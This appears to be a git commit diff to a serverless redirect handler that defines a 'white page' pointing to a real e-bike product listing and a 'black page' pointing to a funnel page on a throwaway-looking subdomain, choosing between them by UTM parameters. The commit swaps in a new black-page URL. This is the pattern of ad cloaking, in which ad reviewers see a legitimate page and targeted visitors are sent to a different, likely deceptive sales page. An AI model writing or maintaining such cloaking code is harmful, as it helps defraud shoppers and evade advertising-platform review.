e78e4bf19f051c89be6b56b3ad128a163f2b7bf3
blazedheros <mannyaiha7@gmail.com>
2024-12-16 21:17:04 +0530

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://ridstar.com/products/ridstar-dc26-2000w-folding-fat-tire-mountain-electric-bike";
-    const blackPageURL = "https://starofridsnexa.myfunnelish.com/amzkas";
+    const blackPageURL = "https://frenaxopientucyhub.myfunnelish.com/amanode";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
